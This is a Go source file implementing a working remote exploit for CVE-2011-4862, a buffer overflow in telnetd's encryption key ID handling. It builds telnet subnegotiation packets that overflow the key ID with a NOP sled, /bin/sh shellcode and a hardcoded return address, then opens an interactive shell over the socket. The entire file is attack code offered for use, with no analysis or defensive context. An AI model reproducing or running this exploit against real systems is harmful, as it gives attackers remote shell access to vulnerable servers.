package exploit

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strings"
)

//Class CVE_2011_4862
type CVE_2011_4862 struct {
	IS           string
	CFB64_IV     string
	DES_CFB64    string
	SUBNEGOEND   string
	SUBNEGO      string
	IAC          string
	ENCRYPT      string
	call_edx     *bytes.Buffer
	junk_address *bytes.Buffer
}

//Empty Constructor
func New_CVE_2011_4862() *CVE_2011_4862 {
	exploit := new(CVE_2011_4862)
	exploit.IS = "\x00"
	exploit.CFB64_IV = "\x01"
	exploit.DES_CFB64 = "\x01"
	exploit.SUBNEGOEND = "\xF0"
	exploit.SUBNEGO = "\xFA"
	exploit.ENCRYPT = "\x26"
	exploit.IAC = "\xFF"
	exploit.call_edx = new(bytes.Buffer)
	binary.Write(exploit.call_edx, binary.LittleEndian, uint32(0x0804a869))
	exploit.junk_address = new(bytes.Buffer)
	binary.Write(exploit.junk_address, binary.LittleEndian, uint32(0x08057c10))
	return exploit
}

/// Functions ///
func (self CVE_2011_4862) Start(sock net.Conn) {
	JUNK := strings.Repeat("\x00", 8)
	init := self.IAC + self.SUBNEGO + self.ENCRYPT + self.IS + self.DES_CFB64 + self.CFB64_IV + JUNK + self.IAC + self.SUBNEGOEND
	fmt.Fprintf(sock, init)
	buf := make([]byte, 1024)
	bufio.NewReader(sock).Read(buf)
	self.exploit(sock)
}

func (self CVE_2011_4862) exploit(sock net.Conn) {
	JUNK := strings.Repeat("\x90", 4)
	init := self.IAC + self.SUBNEGO + self.ENCRYPT + "\x07"
	keyid_overwrite := strings.Repeat("\x90", (64-len(self.get_shellcode()))) + self.get_shellcode() + JUNK + JUNK + string(self.junk_address.Bytes()) + string(self.call_edx.Bytes())
	payload := init + keyid_overwrite + self.IAC + self.SUBNEGOEND
	for i := 0; i < 2; i++ {
		fmt.Fprintf(sock, payload)
	}
	self.Interactive(sock)
}

func (self CVE_2011_4862) get_shellcode() string {
	nopsleed := strings.Repeat("\x90", 10)
	shellcode := "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80"
	return nopsleed + shellcode
}

func (self CVE_2011_4862) Interactive(sock net.Conn) {
	bufRead := make([]byte, 1024)
	sock.Read(bufRead)
	fmt.Fprintf(sock, "\n")
	for {
		bufRead = make([]byte, 1024)
		sock.Read(bufRead)
		fmt.Print(string(bufRead))
		fmt.Print(">> ")
		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		fmt.Fprintf(sock, input)
	}
}
